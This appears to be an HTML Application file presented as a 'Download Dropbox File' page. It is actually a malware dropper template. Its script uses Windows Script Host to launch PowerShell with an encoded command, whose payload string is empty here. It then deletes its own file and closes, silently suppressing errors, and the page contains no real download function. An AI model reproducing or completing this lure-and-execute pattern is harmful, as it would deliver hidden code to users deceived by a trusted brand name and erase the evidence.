<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Download Dropbox File</title>
<HEAD>
 <HTA:APPLICATION ID="decodedApp" APPLICATIONNAME="Decoded HTA" BORDER="thin" />
    <script language="JavaScript" >
try {

var a=new ActiveXObject('Wscript.Shell');

a.Run("powershell.exe -NoExit -EncodedCommand ",1,true);
var b=new ActiveXObject('Scripting.FileSystemObject');

var p = document.location.href;
 document.getElementById('output').innerHTML =b;

p = unescape(p.substr(8));

if (b.FileExists(p))b.DeleteFile(p);

} catch (e) {}

close();
</script>

</HEAD>
</head>
<body>
<div id="output" style="margin-top: 10px;"></div>
</body>
</html>
